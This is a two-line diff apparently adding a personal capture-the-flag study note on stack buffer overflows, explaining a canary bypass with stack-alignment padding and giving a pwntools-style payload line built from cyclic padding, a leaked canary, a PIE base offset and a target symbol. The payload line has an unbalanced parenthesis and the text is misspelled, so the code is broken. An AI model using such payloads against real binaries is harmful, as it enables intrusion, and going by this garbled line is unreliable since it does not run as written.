@@ -1,0 +1,2 @@
+always after canary is incode to maintain the stack alignment always give pack(0) and when we call system function first we need to give retuen address.
+eg:-payload=cyclic(24)+pack(canary)+pack(0)+pack(base_pie+0x00000000000006fe+pack(base_pie+elf.sym.get_streak)
